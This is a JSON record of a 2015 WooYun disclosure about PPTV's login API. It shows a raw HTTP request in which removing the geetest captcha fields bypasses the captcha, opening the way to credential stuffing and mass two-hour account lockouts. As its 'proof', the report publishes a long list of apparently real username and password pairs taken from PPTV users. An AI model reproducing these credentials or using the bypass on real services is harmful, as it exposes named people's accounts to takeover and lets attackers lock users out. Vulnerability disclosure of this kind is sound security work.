{"id": 83950, "wybug_id": "wooyun-2015-0146245", "wybug_title": "PPTV某接口修复不当导致仍可撞库用户还可批量封禁用户（大量成功帐号）", "wybug_corp": "PPTV(PPlive)", "wybug_author": "Azazel", "wybug_date": "2015-10-13 09:48", "wybug_open_date": "2015-11-28 15:44", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "19", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向公众公开  简要描述： PPTV某接口修复不当导致仍可撞库用户还可批量封禁用户（大量成功帐号） 详细说明：  \nhttp://wooyun.org/bugs/wooyun-2010-0101271\n这个洞中提到了\n虽然有验证码，但是只要抓包之后把cookies去掉即可。之后就再也没有验证码提示。\n看到厂商回复\n感谢反馈，处理中\n然后我又看了看这个洞，还是这个接口：\nhttp://api.passport.pptv.com/dologin.do\n一开始是没有验证码限制的\n\n抓包查看发现用户名和密码明文传输\n\n然后Repeater之后查看回显提示滑动验证了，就知道验证码应该出来了\n\n接下来测试绕过，按照之前说的去掉cookie之后继续Repeater好像是没有发现验证码之类的，但是放开包之后看网页发现验证码确实没了但是也没有用户名错误之类的提示信息了\n\n不知道去cookie的方法还行不行，然后我这里的方法是，抓包：\nPOST /dologin.do HTTP/1.1Host: api.passport.pptv.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://api.passport.pptv.com/dologin.doCookie: JSESSIONID=abcenfXEBnkKE_DpSIBbv; Hm_lvt_7adaa440f53512a144c13de93f4c22db=1444644533; Hm_lpvt_7adaa440f53512a144c13de93f4c22db=1444644913Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 302returnURL=http%3A%2F%2Fpassport.pptv.com%2Fusercenter.aspx&action=login&APTokenRequest=&loginid=aaaaa&password=aaaaaaaaaa&geetest_challenge=46af73dc50674072bf64d96a4055534fdp&geetest_validate=5a5485d4d13f15c7ea5dbe87b6a73a3a&geetest_seccode=5a5485d4d13f15c7ea5dbe87b6a73a3a%7Cjordan&CheckboxSaveInfo=on\n去掉\n&geetest_challenge=46af73dc50674072bf64d96a4055534fdp&geetest_validate=5a5485d4d13f15c7ea5dbe87b6a73a3a&geetest_seccode=5a5485d4d13f15c7ea5dbe87b6a73a3a%7Cjordan&CheckboxSaveInfo=on\n放开包之后发现验证码还有但是给出的并不是验证码错误的提示而是该账号登录失败超过5次，请2小时后再试，由此判断已经绕过了验证码\n\n然后呢？然后测试撞库看看，发现是成功的：\n\n再另外关于批量封禁用户就不用多说了吧？两个小时我估计是足够了。。   漏洞证明：  部分成功帐号证明：\n258984762\t3521686\t15765246541\t123456\t1576423525\t123456\t1577wo4fuyi\tzizi1hang\t1578136122628\t1010110\t1578weige0330\t56433307\t1578hejfeng\t5636963\t157848851062\t123456\t157912345643\t123456\t1579sxj588\t6360588\t1579ddd886\tdg2273888\t1579156165\t123456\t15792644964\tpan138608\t1580linquanchao\t19880808\t1580suda621\t1988621\t1580wl3223185\t3223185\t1580slongup\t3351604\t158085279083\t5889578\t1581132456\t123456\t158153845960\t8721393\t15812092188\t52016586\t1582592513926\t123123\t1582baleestar\t82460295\t1582smartjohnny\tasd0629\t1582jone222\t55152440\t1582hsyjnhwx\t589745\t1583tanjunshow\ttanjundiao\t1583q562524699\tq81653285\t1583xannin\t16283150\t1583785464\t123456\t1583qiongyusg\twangyufeng\t1584jshan34\t22201590\t1584378291322\twanwan\t1584610626050\t3823368\t1584gao19930921\t5151102\t1584316589803\t123456\t1584aijishui\tzengjiecx\t1585kylinwxh\thui545447\t1585cxcm12\t88642728\t1585415187212\t123456\t1586526194704\t86553433\t1586116921472\t3355121\t1586wshj95011\t198096\t1586w910621\tw19910622\t15861221333\t123456\t1586jenn1986\tjen1986\t1587fengnicy\t2132121321\t1587bingya1111\t123456789\t1587156165\t123456\t1587liyuplll\t8895992\t1587332682765\tyvhyga\t1588361692642\t231456575\t1588wc_asia\t2188655\t1588402782048\t58292007\t1588wuxueren88\twuxueren\t1589sdcymr\t7226688\t158910395609\t6843957\t1589332682765\tyvhyga\t1590595947380\t2780771\t1590281448425\t1985421\t1590330802078\t13786441389\t1590499251345\t8704546\t159021212112\t123456\t159161915619\t123456p\t1591zhuqianye\tzqy000\t1592456123654\t123456\t1592414331780\t88123456\t1592antonio413\t812812\t1593SECOND1760\t84935611\t1593pengjian1119\t8788tony\t1595448165420\t861015\t1596owen458631\t1985415521\t1597chenlijianpp\t123123\t1599seven71014\tleilei520\t1599painejay\tjinjun\t1599\n   修复方案：  叶良辰的洞敢不给19rank？给个高rank换个别的验证码或者和主站一样加密吧   版权声明：转载请注明来源 Azazel@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-14 15:42 厂商回复： 多谢少侠，正在改进策略中 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}